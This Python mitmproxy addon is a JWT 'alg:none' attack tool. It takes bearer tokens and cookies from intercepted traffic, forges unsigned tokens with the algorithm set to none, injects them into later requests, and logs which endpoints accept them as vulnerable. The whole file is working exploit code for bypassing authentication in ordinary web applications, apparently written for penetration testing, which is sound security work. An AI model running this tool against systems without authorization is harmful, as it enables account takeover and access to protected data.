from mitmproxy import http
import base64
import json
from datetime import datetime

RESULT_FILE = "jwt_attack_results_script1.txt"
DYNAMIC_ENDPOINT_FILE = "jwt_endpoints_dynamic.txt"

AUTH_ERROR_KEYWORDS = [
    "unauthorized",
    "forbidden",
    "not authorized",
    "access denied",
    "invalid token"
]

baseline = {}
tested = set()
dynamic_endpoints = set()

modified_jwt = None

# ---------------- helpers ----------------

def b64_decode(data):
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data).decode(errors="ignore")

def b64_encode(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

def forge_alg_none(token):
    try:
        h, p, _ = token.split(".")
        header = json.loads(b64_decode(h))
        header["alg"] = "none"
        header.pop("kid", None)
        return f"{b64_encode(json.dumps(header))}.{p}."
    except Exception:
        return None

def extract_jwt(flow):
    auth = flow.request.headers.get("Authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:]

    for c in flow.request.cookies.values():
        if c.count(".") == 2:
            return c
    return None

def log_dynamic(flow):
    key = f"{flow.request.method} {flow.request.path}"
    if key not in dynamic_endpoints:
        dynamic_endpoints.add(key)
        with open(DYNAMIC_ENDPOINT_FILE, "a") as f:
            f.write(key + "\n")

def log_result(flow, result, verdict, confidence):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    size = len(flow.response.content or b"")

    with open(RESULT_FILE, "a") as f:
        f.write(
            f"[{ts}]\n"
            f"ATTACK: JWT alg:none\n"
            f"METHOD: {flow.request.method}\n"
            f"URL: {flow.request.path}\n"
            f"STATUS: {flow.response.status_code}\n"
            f"RESPONSE_SIZE: {size} bytes\n"
            f"RESULT: {result}\n"
            f"VERDICT: {verdict}\n"
            f"CONFIDENCE: {confidence}\n"
            f"{'-'*60}\n\n"
        )

# ---------------- mitmproxy hooks ----------------

def request(flow: http.HTTPFlow):
    global modified_jwt
    log_dynamic(flow)

    if modified_jwt:
        flow.request.headers["Authorization"] = f"Bearer {modified_jwt}"
        for k in flow.request.cookies:
            flow.request.cookies[k] = modified_jwt

def response(flow: http.HTTPFlow):
    global modified_jwt

    key = (flow.request.method, flow.request.path)
    status = flow.response.status_code
    size = len(flow.response.content or b"")

    # BASELINE
    if key not in baseline:
        baseline[key] = (status, size)

        token = extract_jwt(flow)
        if token:
            forged = forge_alg_none(token)
            if forged:
                modified_jwt = forged
        return

    # DECISION
    if key in tested or not modified_jwt:
        return
    tested.add(key)

    body = flow.response.get_text(strict=False).lower()
    auth_error = any(e in body for e in AUTH_ERROR_KEYWORDS)

    if status == 200 and not auth_error:
        verdict = "VULNERABLE"
        result = "JWT alg:none accepted (signature verification disabled)"
        confidence = "HIGH"

    elif status in (401, 403):
        verdict = "NOT VULNERABLE"
        result = "JWT alg:none rejected"
        confidence = "HIGH"

    else:
        verdict = "NOT VULNERABLE"
        result = "Unexpected behavior after alg:none injection"
        confidence = "MEDIUM"

    log_result(flow, result, verdict, confidence)
